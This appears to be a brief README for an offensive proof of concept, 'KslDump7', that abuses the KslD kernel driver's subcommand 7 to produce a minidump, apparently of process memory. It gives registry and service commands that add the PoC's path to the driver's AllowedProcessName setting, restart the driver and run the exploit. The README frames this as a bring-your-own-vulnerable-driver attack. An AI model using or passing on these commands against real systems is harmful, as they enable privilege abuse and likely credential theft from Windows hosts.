# KslDump7
Use SubCmd 7 not 2+12.

You have already been "BYOVD"ed.

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Services\KslD /v AllowedProcessName /t REG_SZ /d "\Device\HarddiskVolume3\path\to\poc_subcmd7_minidump.exe" /f
sc stop KslD
sc start KslD
poc.exe
```
